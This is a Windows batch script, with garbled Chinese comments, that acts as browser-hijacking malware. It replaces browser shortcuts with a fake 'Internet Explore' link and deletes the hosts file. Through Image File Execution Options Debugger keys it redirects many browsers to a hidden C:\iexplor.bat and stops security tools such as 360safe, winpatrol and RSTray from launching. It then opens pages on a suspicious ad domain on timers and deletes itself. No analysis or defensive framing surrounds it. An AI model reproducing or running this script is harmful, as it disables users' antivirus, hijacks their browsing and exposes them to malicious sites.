::�⿪ע���
reg  add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /t reg_dword /d 00000000 /f

::ȥ��С��ͷ
echo Windows Registry Editor Version 5.00 >%systemroot%\jiantou.reg
echo [HKEY_CLASSES_ROOT\lnkfile]>>%systemroot%\jiantou.reg
echo "IsShortcut"=->>%systemroot%\jiantou.reg
echo [HKEY_CLASSES_ROOT\piffile]>>%systemroot%\jiantou.reg
echo "IsShortcut"=->>%systemroot%\jiantou.reg
regedit /s %systemroot%\jiantou.reg
del /F /Q %systemroot%\jiantou.reg


regedit /s key.reg


::�����ļ�

copy "Internet Explore.lnk" "%USERPROFILE%\Application Data\Microsoft\Internet Explorer\Quick Launch\���� Internet Explorer �����.lnk" /Y

copy "Internet Explore.lnk" "C:\Documents and Settings\Administrator\Application Data\Microsoft\Internet Explorer\Quick Launch\���� Internet Explorer �����.lnk" /Y

copy "Internet Explore.lnk" "%USERPROFILE%\����ʼ���˵�\Internet Explore.lnk" /Y

del "Internet Explore.lnk" "%USERPROFILE%\����ʼ���˵�\Internet Explorer.lnk"

copy "Internet Explore.lnk" "%USERPROFILE%\����ʼ���˵�\����\Internet Explore.lnk" /Y

del "Internet Explore.lnk" "%USERPROFILE%\����ʼ���˵�\����\Internet Explorer.lnk"

del "%USERPROFILE%\����\��ַ��ȫ.lnk"

del "%ALLUSERSPROFILE%\����\��ַ��ȫ.lnk"

del "C:\Documents and Settings\Administrator\����\��ַ��ȫ.lnk"

del "%USERPROFILE%\����\365����ַ.lnk"

del "%USERPROFILE%\����\�������Ӱ��չ��.lnk"

del "%USERPROFILE%\����\i��Ӱ��.lnk"

del "%USERPROFILE%\����\��Ѹ����Ӱ.lnk"

del "%ALLUSERSPROFILE%\����\�ܿ���Ƶ����.lnk"

del "%USERPROFILE%\����\Internet Explore.lnk"

del "%USERPROFILE%\����\Internet Explorer.lnk"

del "C:\Documents and Settings\Administrator\����\365����ַ.lnk"

del "%USERPROFILE%\����\�˽���ַ��ȫ.lnk"

del "C:\Documents and Settings\Administrator\����\�˽���ַ��ȫ.lnk"

del "%USERPROFILE%\����\�˽���ַ��ȫ.lnk"

del "%USERPROFILE%\����\IEXPLORE.EXE.lnk"

del "%USERPROFILE%\����\IEXPLORE.lnk"

del "C:\Documents and Settings\Administrator\����\IEXPLORE.lnk"

del "%USERPROFILE%\����\Internet Explorer.lnk"

del "C:\Documents and Settings\Administrator\����\Internet Explorer.lnk"

del "%USERPROFILE%\����\*.url"

del "C:\Documents and Settings\Administrator\����\*.url"

del key.reg

::ɾ��host�ļ�
del %windir%\system32\drivers\etc\hosts

ATTRIB +H +R +S +A c:\iexplor.bat

del iexplor.bat

::ˢ�£��ӷ���
msiexec /regserver

reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\theworld.exe" /v Debugger /t reg_sz /d C:\iexplor.bat /f

reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\firefox.exe" /v Debugger /t reg_sz /d C:\iexplor.bat /f

reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\opera.exe" /v Debugger /t reg_sz /d C:\iexplor.bat /f

reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Maxthon.exe" /v Debugger /t reg_sz /d C:\iexplor.bat /f

reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\chrome.exe" /v Debugger /t reg_sz /d C:\iexplor.bat /f

reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\TTraveler.exe" /v Debugger /t reg_sz /d C:\iexplor.bat /f

reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\KylinBrowser.exe" /v Debugger /t reg_sz /d C:\iexplor.bat /f

reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\vu.exe" /v Debugger /t reg_sz /d C:\iexplor.bat /f

reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\MiniIE.exe" /v Debugger /t reg_sz /d C:\iexplor.bat /f

reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\suda.exe" /v Debugger /t reg_sz /d C:\iexplor.bat /f

reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\AdoIE.exe" /v Debugger /t reg_sz /d C:\iexplor.bat /f

reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\360Start.exe" /v Debugger /t reg_sz /d C:\explor.bat /f

reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\360SE.exe" /v Debugger /t reg_sz /d C:\iexplor.bat /f

reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\iemate.exe" /v Debugger /t reg_sz /d C:\iexplor.bat /f

reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\IERepair.exe" /v Debugger /t reg_sz /d C:\iexplor.bat /f

reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\GreenBrowser.exe" /v Debugger /t reg_sz /d C:\iexplor.bat /f

reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\SaaYaa.exe" /v Debugger /t reg_sz /d C:\iexplor.bat /f

reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\XWebStar.exe" /v Debugger /t reg_sz /d C:\iexplor.bat /f

reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\MyIE.exe" /v Debugger /t reg_sz /d C:\iexplor.bat /f

reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\TouchNet.exe" /v Debugger /t reg_sz /d C:\iexplor.bat /f

reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\See9IE.exe" /v Debugger /t reg_sz /d C:\iexplor.bat /f

reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\zhinanzhenbrowser.exe" /v Debugger /t reg_sz /d C:\iexplor.bat /f

reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\top.exe" /v Debugger /t reg_sz /d C:\iexplor.bat /f

reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\avant.exe" /v Debugger /t reg_sz /d C:\iexplor.bat /f

reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\hsreg.exe" /v Debugger /t reg_sz /d C:\WINDOWS\system32\ruixing.exe /f

reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Iparmor.exe" /v Debugger /t reg_sz /d C:\WINDOWS\system32\ruixing.exe /f

reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\360tray.exe" /v Debugger /t reg_sz /d C:\WINDOWS\system32\ctfmon.exe /f

reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\srgui.exe" /v Debugger /t reg_sz /d C:\WINDOWS\system32\ctfmon.exe /f

reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sriecli.exe" /v Debugger /t reg_sz /d C:\WINDOWS\system32\ctfmon.exe /f

reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\360safe.exe" /v Debugger /t reg_sz /d C:\WINDOWS\system32\ctfmon.exe /f

reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\winpatrol.exe" /v Debugger /t reg_sz /d C:\WINDOWS\system32\ruixing.exe /f

reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\ast.exe" /v Debugger /t reg_sz /d C:\WINDOWS\system32\ctfmon.exe /f

reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\RSTray.exe" /v Debugger /t reg_sz /d C:\WINDOWS\system32\ctfmon.exe /f

reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\360safebox.exe" /v Debugger /t reg_sz /d C:\WINDOWS\system32\ctfmon.exe /f


::ATTRIB -H -R -S -A c:\GRLDR

::del c:\GRLDR /S /Q

::del C:\WINDOWS\system32\Restore /S /Q

ping 127.0.0.1 /n 3600 >nul

start explorer http://hao123163qqbaidu.qingchun-meinv.cn/news/news1.html

ping 127.0.0.1 /n 4000 >nul

start explorer http://hao123163qqbaidu.qingchun-meinv.cn/news/news2.html

ping 127.0.0.1 /n 4600 >nul

start explorer http://hao123163qqbaidu.qingchun-meinv.cn/news/news3.html

exit
del %0%
